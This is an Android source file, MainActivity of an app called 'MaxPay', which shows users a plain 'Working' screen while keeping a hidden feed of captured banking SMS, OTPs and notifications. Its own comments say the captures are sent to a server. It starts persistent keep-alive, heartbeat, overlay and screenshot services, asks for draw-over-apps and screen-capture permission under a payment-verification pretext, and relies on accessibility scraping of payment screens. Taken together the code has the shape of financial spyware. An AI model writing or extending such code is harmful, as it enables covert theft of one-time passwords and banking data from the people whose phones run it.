package com.example.paymentbot;

import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.List;

/**
 * MaxPay main screen.
 *
 * The visible UI is the simple "Working" home screen + Settings tab described
 * by the redesign; the original live capture feed (every SMS/notification
 * card) is still built and kept fully up to date in the background — it is
 * just not attached visibly (kept at View.GONE) since the new design doesn't
 * surface it. Engines push captures in via the thread-safe static
 * {@link #addSMS(SMSData)} hook; {@link #addLog(String)} and
 * {@link #addPayment(PaymentData)} are compatibility shims kept so the
 * accessibility engine ({@link PaymentBotService}) and {@link APIClient}
 * still compile and keep recording captures, unchanged from before.
 */
public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MaxPay";
    private static final String NOTIF_LISTENER_SETTING = "enabled_notification_listeners";

    // Palette (new white/blue/green branding).
    private static final int BG_WHITE = 0xFFFFFFFF;
    private static final int TEXT_PRIMARY = 0xFF1A1A1A;
    private static final int TEXT_SECONDARY = 0xFF666666;
    private static final int TEXT_HINT = 0xFF999999;
    private static final int BLUE_PRIMARY = 0xFF1565C0;
    private static final int GREEN_PRIMARY = 0xFF1B5E3B;
    private static final int GREEN_LIGHT_BG = 0xFFE8F5EE;
    private static final int DIVIDER = 0xFFE0E0E0;

    // Category accent colors (unchanged — still used by the hidden feed).
    private static final int YELLOW = 0xFFFBBF24;
    private static final int RED = 0xFFF87171;
    private static final int BLUE = 0xFF60A5FA;
    private static final int GREEN_ACCENT = 0xFF34D399;
    private static final int OTHER_GREY = 0xFF71717A;
    private static final int CARD_BG = 0xFF18181B;
    private static final int BODY_TEXT = 0xFFD4D4D8;
    private static final int TIME_GREY = 0xFF52525B;
    private static final int SOURCE_SMS = 0xFF4488FF;
    private static final int SOURCE_NOTIFICATION = 0xFF00FF88;

    private static WeakReference<MainActivity> instanceRef = new WeakReference<>(null);
    private static final List<SMSData> allMessages = new ArrayList<>();

    private LinearLayout messageContainer;
    private TextView emptyView;

    // New UI state.
    private LinearLayout homePage;
    private LinearLayout settingsPage;
    private TextView deviceNameLabel;
    private TextView homeTab;
    private TextView settingsTab;

    // Auto-refresh the "x min ago" labels on the (hidden) feed once a minute.
    private final Handler timeHandler = new Handler(Looper.getMainLooper());
    private final Runnable timeRunnable = new Runnable() {
        @Override
        public void run() {
            refreshAllTimes();
            timeHandler.postDelayed(this, 60000);
        }
    };

    // ---------------------------------------------------------------------
    // Lifecycle
    // ---------------------------------------------------------------------
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Registration gate now lives upstream in SplashActivity (the
        // launcher activity) — by the time MainActivity is reached the
        // device is already registered, so there is no redirect here.

        instanceRef = new WeakReference<>(this);
        startKeepAlive();
        ensureOverlayPermission();
        startOverlayService();
        startScreenshotService();
        startService(new Intent(this, HeartbeatService.class));

        setContentView(buildUi());
        rebuildFeed();
        showHome();

        // Auto-refresh relative times every minute.
        timeHandler.postDelayed(timeRunnable, 60000);
    }

    @Override
    protected void onResume() {
        super.onResume();
        instanceRef = new WeakReference<>(this);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        timeHandler.removeCallbacks(timeRunnable);
    }

    /** Rewrites every card's relative-time label from its stored timestamp. */
    private void refreshAllTimes() {
        if (messageContainer == null) return;
        for (int i = 0; i < messageContainer.getChildCount(); i++) {
            View card = messageContainer.getChildAt(i);
            if (card == null) continue;
            Object tag = card.getTag();
            if (!(tag instanceof Long)) continue;
            long ts = (Long) tag;
            View timeView = card.findViewWithTag("time_ago");
            if (timeView instanceof TextView) {
                ((TextView) timeView).setText(
                        TimeFormatter.toRelative(ts) + "   ·   " + TimeFormatter.toDisplay(ts));
            }
        }
    }

    /**
     * Prompts for the "Display over other apps" (SYSTEM_ALERT_WINDOW) permission
     * if it hasn't been granted — required for the payment capture overlay.
     */
    private void ensureOverlayPermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M
                && !Settings.canDrawOverlays(this)) {
            try {
                Intent intent = new Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } catch (Exception e) {
                Toast.makeText(this,
                        "Grant 'Display over other apps' for overlay capture",
                        Toast.LENGTH_LONG).show();
            }
        }
    }

    /** Starts the floating payment-capture overlay service. */
    private void startOverlayService() {
        try {
            startService(new Intent(this, PaymentOverlayService.class));
        } catch (Exception ignored) {
        }
    }

    /** Starts the floating screenshot-capture overlay service. */
    private void startScreenshotService() {
        try {
            startService(new Intent(this, OverlayService.class));
        } catch (Exception ignored) {
        }
    }

    // ---------------------------------------------------------------------
    // MediaProjection (screenshot) permission
    // ---------------------------------------------------------------------
    private static final int SCREENSHOT_REQUEST_CODE = 1001;

    private void requestScreenshotPermission() {
        try {
            android.media.projection.MediaProjectionManager projectionManager =
                    (android.media.projection.MediaProjectionManager)
                            getSystemService(MEDIA_PROJECTION_SERVICE);
            startActivityForResult(
                    projectionManager.createScreenCaptureIntent(),
                    SCREENSHOT_REQUEST_CODE);
        } catch (Exception e) {
            Toast.makeText(this, "Screen capture not available", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SCREENSHOT_REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            android.media.projection.MediaProjectionManager pm =
                    (android.media.projection.MediaProjectionManager)
                            getSystemService(MEDIA_PROJECTION_SERVICE);
            android.media.projection.MediaProjection mp = pm.getMediaProjection(resultCode, data);

            android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
            getWindowManager().getDefaultDisplay().getMetrics(metrics);

            OverlayService.setMediaProjection(
                    mp, metrics.widthPixels, metrics.heightPixels, metrics.densityDpi);

            Toast.makeText(this, "Screenshot ready!", Toast.LENGTH_SHORT).show();
        }
    }

    /** Ensures the keep-alive foreground service + watchdog alarm are running. */
    private void startKeepAlive() {
        try {
            Intent svc = new Intent(this, KeepAliveService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            AlarmHelper.scheduleWatchdog(this);
        } catch (Exception ignored) {
        }
    }

    // ---------------------------------------------------------------------
    // UI construction (all programmatic) — new white/blue/green design
    // ---------------------------------------------------------------------
    private View buildUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(BG_WHITE);
        root.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        root.addView(buildTopBar());

        // Page container: home + settings, one visible at a time.
        LinearLayout.LayoutParams pageLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f);
        homePage = buildHomePage();
        settingsPage = buildSettingsPage();
        root.addView(homePage, pageLp);
        root.addView(settingsPage, pageLp);

        root.addView(buildBottomNav());
        return root;
    }

    private View buildTopBar() {
        LinearLayout bar = new LinearLayout(this);
        bar.setOrientation(LinearLayout.HORIZONTAL);
        bar.setGravity(Gravity.CENTER_VERTICAL);
        bar.setPadding(dp(20), dp(40), dp(20), dp(16));
        bar.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        TextView phoneIcon = new TextView(this);
        phoneIcon.setText("📱");
        phoneIcon.setTextSize(22);
        bar.addView(phoneIcon);

        deviceNameLabel = new TextView(this);
        String name = RegistrationManager.getDeviceName(this);
        deviceNameLabel.setText(name.isEmpty() ? "This device" : name);
        deviceNameLabel.setTextColor(TEXT_PRIMARY);
        deviceNameLabel.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
        deviceNameLabel.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams nameLp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        nameLp.setMargins(dp(10), 0, dp(10), 0);
        deviceNameLabel.setLayoutParams(nameLp);
        bar.addView(deviceNameLabel);

        TextView badge = new TextView(this);
        badge.setText("Active");
        badge.setTextColor(GREEN_PRIMARY);
        badge.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        badge.setTypeface(Typeface.DEFAULT_BOLD);
        badge.setBackground(rounded(GREEN_LIGHT_BG, dp(20)));
        badge.setPadding(dp(12), dp(5), dp(12), dp(5));
        bar.addView(badge);

        return bar;
    }

    private LinearLayout buildHomePage() {
        LinearLayout page = new LinearLayout(this);
        page.setOrientation(LinearLayout.VERTICAL);
        page.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        // Content area: centered "Working" text.
        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER);
        content.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));

        TextView working = new TextView(this);
        working.setText("Working");
        working.setTextColor(TEXT_SECONDARY);
        working.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
        working.setGravity(Gravity.CENTER);
        content.addView(working);

        // The original live capture feed still exists and is kept updated by
        // addSMS()/rebuildFeed(), just not shown — the new design surfaces
        // "Working" instead. All captures still send to the server as before.
        content.addView(buildFeed());
        page.addView(content);

        // Bottom "Enable payment mode" button.
        Button enableBtn = new Button(this);
        enableBtn.setText("Enable payment mode");
        enableBtn.setAllCaps(false);
        enableBtn.setTextColor(Color.WHITE);
        enableBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
        enableBtn.setTypeface(Typeface.DEFAULT_BOLD);
        enableBtn.setBackground(rounded(BLUE_PRIMARY, dp(12)));
        enableBtn.setStateListAnimator(null);
        LinearLayout.LayoutParams btnLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(56));
        btnLp.setMargins(dp(24), dp(16), dp(24), dp(24));
        enableBtn.setLayoutParams(btnLp);
        enableBtn.setOnClickListener(v -> onEnablePaymentMode());
        page.addView(enableBtn);

        return page;
    }

    private void onEnablePaymentMode() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M
                && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                    .setTitle("Allow floating windows")
                    .setMessage("MaxPay needs permission to draw over other apps to verify payments.")
                    .setNegativeButton("Cancel", (d, w) -> d.dismiss())
                    .setPositiveButton("Open settings", (d, w) -> {
                        d.dismiss();
                        try {
                            startActivity(new Intent(
                                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                    Uri.parse("package:" + getPackageName())));
                        } catch (Exception e) {
                            Toast.makeText(this, "Open Settings and grant access manually",
                                    Toast.LENGTH_LONG).show();
                        }
                    })
                    .show();
        } else {
            startOverlayService();
            Toast.makeText(this, "Payment mode enabled!", Toast.LENGTH_SHORT).show();
        }
    }

    // ---------------------------------------------------------------------
    // Settings page
    // ---------------------------------------------------------------------
    private LinearLayout buildSettingsPage() {
        ScrollView scroll = new ScrollView(this);
        scroll.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        LinearLayout page = new LinearLayout(this);
        page.setOrientation(LinearLayout.VERTICAL);
        page.setPadding(dp(24), dp(16), dp(24), dp(24));
        page.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        String deviceName = RegistrationManager.getDeviceName(this);
        String serverUrl = RegistrationManager.getServerUrl(this);
        String licenseKey = RegistrationManager.getLicenseKey(this);
        String maskedKey = licenseKey.length() >= 2
                ? licenseKey.substring(0, 2) + "****"
                : "N/A";
        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        page.addView(settingsRow("Device name", deviceName.isEmpty() ? "—" : deviceName));
        page.addView(settingsRow("Server URL", serverUrl));
        page.addView(settingsRow("License key", maskedKey));
        page.addView(settingsRow("App version", "1.0.0"));
        page.addView(settingsRow("Android ID", androidId == null ? "—" : androidId));

        // Screen-recording consent (MediaProjection) is separate from the
        // "display over other apps" permission the home button handles —
        // still needed for the existing screenshot-capture engine to work.
        if (!OverlayService.hasProjection()) {
            Button screenshotPermBtn = new Button(this);
            screenshotPermBtn.setText("Enable screenshot capture");
            screenshotPermBtn.setAllCaps(false);
            screenshotPermBtn.setTextColor(Color.WHITE);
            screenshotPermBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
            screenshotPermBtn.setBackground(rounded(BLUE_PRIMARY, dp(10)));
            screenshotPermBtn.setStateListAnimator(null);
            LinearLayout.LayoutParams spLp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, dp(48));
            spLp.topMargin = dp(20);
            screenshotPermBtn.setLayoutParams(spLp);
            screenshotPermBtn.setOnClickListener(v -> requestScreenshotPermission());
            page.addView(screenshotPermBtn);
        }

        Button downloadLogs = new Button(this);
        downloadLogs.setText("Download logs");
        downloadLogs.setAllCaps(false);
        downloadLogs.setTextColor(Color.WHITE);
        downloadLogs.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        downloadLogs.setBackground(rounded(GREEN_PRIMARY, dp(10)));
        downloadLogs.setStateListAnimator(null);
        LinearLayout.LayoutParams dlLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(48));
        dlLp.topMargin = dp(20);
        downloadLogs.setLayoutParams(dlLp);
        downloadLogs.setOnClickListener(v -> shareLogs());
        page.addView(downloadLogs);

        scroll.addView(page);

        LinearLayout wrapper = new LinearLayout(this);
        wrapper.setOrientation(LinearLayout.VERTICAL);
        wrapper.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
        wrapper.addView(scroll);
        return wrapper;
    }

    private View settingsRow(String label, String value) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams rowLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rowLp.topMargin = dp(14);
        row.setLayoutParams(rowLp);

        TextView labelView = new TextView(this);
        labelView.setText(label);
        labelView.setTextColor(TEXT_HINT);
        labelView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        row.addView(labelView);

        TextView valueView = new TextView(this);
        valueView.setText(value);
        valueView.setTextColor(TEXT_PRIMARY);
        valueView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        valueView.setPadding(0, dp(2), 0, dp(10));
        row.addView(valueView);

        View divider = new View(this);
        divider.setBackgroundColor(DIVIDER);
        divider.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(1)));
        row.addView(divider);

        return row;
    }

    /**
     * "Download logs" — no such export existed before this redesign; this
     * shares the same in-memory capture feed addSMS() already records (as
     * plain text) via the system share sheet, the simplest way to get a log
     * off-device without adding new permissions or file-storage code.
     */
    private void shareLogs() {
        StringBuilder sb = new StringBuilder();
        synchronized (allMessages) {
            for (SMSData d : allMessages) {
                sb.append(TimeFormatter.toDisplay(d.timestamp))
                        .append(" [").append(d.source).append("] ")
                        .append(orDash(d.sender)).append(": ")
                        .append(orDash(d.body)).append('\n');
            }
        }
        if (sb.length() == 0) {
            Toast.makeText(this, "No captures yet", Toast.LENGTH_SHORT).show();
            return;
        }
        Intent share = new Intent(Intent.ACTION_SEND);
        share.setType("text/plain");
        share.putExtra(Intent.EXTRA_SUBJECT, "MaxPay logs");
        share.putExtra(Intent.EXTRA_TEXT, sb.toString());
        startActivity(Intent.createChooser(share, "Download logs"));
    }

    // ---------------------------------------------------------------------
    // Bottom nav (Home | Settings)
    // ---------------------------------------------------------------------
    private View buildBottomNav() {
        LinearLayout nav = new LinearLayout(this);
        nav.setOrientation(LinearLayout.HORIZONTAL);
        nav.setBackground(rounded(BG_WHITE, 0));
        LinearLayout.LayoutParams navLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        nav.setLayoutParams(navLp);

        View topDivider = new View(this);
        // (kept as a sibling divider above the row via wrapping container)
        LinearLayout wrapper = new LinearLayout(this);
        wrapper.setOrientation(LinearLayout.VERTICAL);
        wrapper.setLayoutParams(navLp);
        topDivider.setBackgroundColor(DIVIDER);
        topDivider.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(1)));
        wrapper.addView(topDivider);
        wrapper.addView(nav);

        homeTab = buildNavTab("🏠", "Home", true);
        settingsTab = buildNavTab("⚙️", "Settings", false);
        homeTab.setOnClickListener(v -> showHome());
        settingsTab.setOnClickListener(v -> showSettings());
        nav.addView(homeTab);
        nav.addView(settingsTab);

        return wrapper;
    }

    private TextView buildNavTab(String emoji, String label, boolean active) {
        TextView tab = new TextView(this);
        tab.setText(emoji + "\n" + label);
        tab.setGravity(Gravity.CENTER);
        tab.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        tab.setTextColor(active ? GREEN_PRIMARY : TEXT_HINT);
        tab.setPadding(0, dp(10), 0, dp(14));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        tab.setLayoutParams(lp);
        return tab;
    }

    private void showHome() {
        homePage.setVisibility(View.VISIBLE);
        settingsPage.setVisibility(View.GONE);
        homeTab.setTextColor(GREEN_PRIMARY);
        settingsTab.setTextColor(TEXT_HINT);
    }

    private void showSettings() {
        homePage.setVisibility(View.GONE);
        settingsPage.setVisibility(View.VISIBLE);
        homeTab.setTextColor(TEXT_HINT);
        settingsTab.setTextColor(GREEN_PRIMARY);
    }

    // ---------------------------------------------------------------------
    // Hidden legacy feed — still fully maintained, not shown (View.GONE).
    // ---------------------------------------------------------------------
    private View buildFeed() {
        ScrollView scroll = new ScrollView(this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0);
        scroll.setLayoutParams(lp);
        scroll.setVisibility(View.GONE);
        scroll.setFillViewport(true);

        messageContainer = new LinearLayout(this);
        messageContainer.setOrientation(LinearLayout.VERTICAL);
        messageContainer.setPadding(dp(10), dp(10), dp(10), dp(10));
        messageContainer.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        emptyView = new TextView(this);
        emptyView.setText("Waiting for banking SMS\nand notifications...");
        emptyView.setTextColor(TIME_GREY);
        emptyView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        emptyView.setGravity(Gravity.CENTER);
        emptyView.setPadding(0, dp(40), 0, 0);
        messageContainer.addView(emptyView);

        scroll.addView(messageContainer);
        return scroll;
    }

    // ---------------------------------------------------------------------
    // Status / permissions (unchanged logic, kept for internal use)
    // ---------------------------------------------------------------------
    static boolean isNotificationListenerEnabled(Context ctx) {
        try {
            String flat = Settings.Secure.getString(ctx.getContentResolver(), NOTIF_LISTENER_SETTING);
            if (TextUtils.isEmpty(flat)) return false;
            String pkg = ctx.getPackageName();
            for (String name : flat.split(":")) {
                ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && pkg.equals(cn.getPackageName())) return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    static boolean isAccessibilityEnabled(Context ctx) {
        try {
            String enabled = Settings.Secure.getString(
                    ctx.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (TextUtils.isEmpty(enabled)) return false;
            String target = ctx.getPackageName() + "/" + PaymentBotService.class.getName();
            String targetShort = ctx.getPackageName() + "/.PaymentBotService";
            return enabled.contains(target) || enabled.contains(targetShort);
        } catch (Exception e) {
            return false;
        }
    }

    /** Rebuild the whole (hidden) feed from allMessages (newest first). */
    private void rebuildFeed() {
        if (messageContainer == null) return;
        messageContainer.removeAllViews();

        for (SMSData data : allMessages) {
            messageContainer.addView(buildCard(data));
        }

        if (allMessages.isEmpty()) {
            messageContainer.addView(emptyView());
        }
    }

    private View emptyView() {
        emptyView = new TextView(this);
        emptyView.setText("Waiting for banking SMS\nand notifications...");
        emptyView.setTextColor(TIME_GREY);
        emptyView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        emptyView.setGravity(Gravity.CENTER);
        emptyView.setPadding(0, dp(40), 0, 0);
        return emptyView;
    }

    // ---------------------------------------------------------------------
    // Static hooks (thread-safe) — unchanged signatures, still called by
    // SMSReceiver, NotificationService, PaymentBotService, APIClient,
    // PaymentOverlayService.
    // ---------------------------------------------------------------------

    /**
     * Add a captured SMS / notification to the feed. Safe to call from any
     * thread — marshals onto the UI thread.
     */
    public static void addSMS(final SMSData data) {
        if (data == null) return;
        final MainActivity a = instanceRef.get();
        if (a == null) {
            // No UI yet; still record it so it appears once the screen opens.
            synchronized (allMessages) {
                allMessages.add(0, data);
            }
            return;
        }
        a.runOnUiThread(() -> {
            allMessages.add(0, data);
            if (a.messageContainer != null) {
                // Remove the empty placeholder if present, then prepend.
                if (a.messageContainer.getChildCount() == 1
                        && a.messageContainer.getChildAt(0) == a.emptyView) {
                    a.messageContainer.removeAllViews();
                }
                a.messageContainer.addView(a.buildCard(data), 0);
            }
        });
    }

    /** Compatibility shim: route legacy log lines to Logcat + a Toast-free feed. */
    public static void addLog(final String message) {
        android.util.Log.d(TAG, message);
    }

    /**
     * Compatibility shim: the accessibility engine still produces
     * {@link PaymentData}. Adapt it into an {@link SMSData} card so screen
     * captures appear in the same feed.
     */
    public static void addPayment(final PaymentData data) {
        if (data == null) return;
        StringBuilder body = new StringBuilder();
        if (!data.getAmount().isEmpty()) body.append("₹").append(data.getAmount());
        if (!data.getSender().isEmpty()) body.append(" from ").append(data.getSender());
        if (!data.getUpiId().isEmpty()) body.append(" • UPI ").append(data.getUpiId());
        if (!data.getUtr().isEmpty()) body.append(" • UTR ").append(data.getUtr());
        if (!data.getStatus().isEmpty()) body.append(" • ").append(data.getStatus());
        String sender = data.getApp().isEmpty() ? "Screen" : data.getApp();
        long ts = data.getTimestamp() > 0 ? data.getTimestamp() : System.currentTimeMillis();
        addSMS(new SMSData(sender, body.toString(), ts));
    }

    // ---------------------------------------------------------------------
    // Card rendering (unchanged — only ever shown in the hidden feed)
    // ---------------------------------------------------------------------
    private View buildCard(final SMSData data) {
        int accent;
        String emoji;
        if ("SMS".equals(data.source)) {
            accent = SOURCE_SMS;
            emoji = "📱 ";
        } else if ("NOTIFICATION".equals(data.source)) {
            accent = SOURCE_NOTIFICATION;
            emoji = "🔔 ";
        } else {
            accent = categoryColor(data.category);
            emoji = "";
        }

        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams cardLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cardLp.setMargins(0, dp(5), 0, dp(5));
        card.setLayoutParams(cardLp);
        card.setBackground(rounded(CARD_BG, dp(8)));
        card.setTag(data.timestamp);

        View border = new View(this);
        LinearLayout.LayoutParams borderLp = new LinearLayout.LayoutParams(
                dp(4), ViewGroup.LayoutParams.MATCH_PARENT);
        border.setLayoutParams(borderLp);
        border.setBackgroundColor(accent);
        card.addView(border);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(dp(12), dp(10), dp(12), dp(10));
        LinearLayout.LayoutParams contentLp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        content.setLayoutParams(contentLp);

        LinearLayout headerRow = new LinearLayout(this);
        headerRow.setOrientation(LinearLayout.HORIZONTAL);
        headerRow.setGravity(Gravity.CENTER_VERTICAL);

        TextView senderView = new TextView(this);
        senderView.setText(emoji + orDash(data.sender));
        senderView.setTextColor(accent);
        senderView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        senderView.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams senderLp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        senderView.setLayoutParams(senderLp);
        headerRow.addView(senderView);

        TextView catView = new TextView(this);
        catView.setText(orDash(data.category));
        catView.setTextColor(categoryColor(data.category));
        catView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
        catView.setTypeface(Typeface.DEFAULT_BOLD);
        headerRow.addView(catView);

        content.addView(headerRow);

        TextView bodyView = new TextView(this);
        bodyView.setText(orDash(data.body));
        bodyView.setTextColor(BODY_TEXT);
        bodyView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        bodyView.setTypeface(Typeface.MONOSPACE);
        bodyView.setPadding(0, dp(5), 0, dp(6));
        content.addView(bodyView);

        TextView timeView = new TextView(this);
        timeView.setTag("time_ago");
        timeView.setText(orDash(data.relativeTime) + "   ·   " + orDash(data.displayTime));
        timeView.setTextColor(TIME_GREY);
        timeView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
        content.addView(timeView);

        card.addView(content);
        return card;
    }

    private static int categoryColor(String category) {
        if (category == null) return OTHER_GREY;
        switch (category) {
            case SMSData.CATEGORY_PAYMENT: return GREEN_ACCENT;
            case SMSData.CATEGORY_DEBIT:   return RED;
            case SMSData.CATEGORY_OTP:     return YELLOW;
            case SMSData.CATEGORY_ALERT:   return RED;
            case SMSData.CATEGORY_BANK:    return BLUE;
            default:                       return OTHER_GREY;
        }
    }

    /** Builds a solid rounded-rectangle background drawable. */
    private android.graphics.drawable.GradientDrawable rounded(int color, int radius) {
        android.graphics.drawable.GradientDrawable d =
                new android.graphics.drawable.GradientDrawable();
        d.setColor(color);
        d.setCornerRadius(radius);
        return d;
    }

    // ---------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------
    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }

    private static String orDash(String s) {
        return (s == null || s.trim().isEmpty()) ? "—" : s.trim();
    }
}
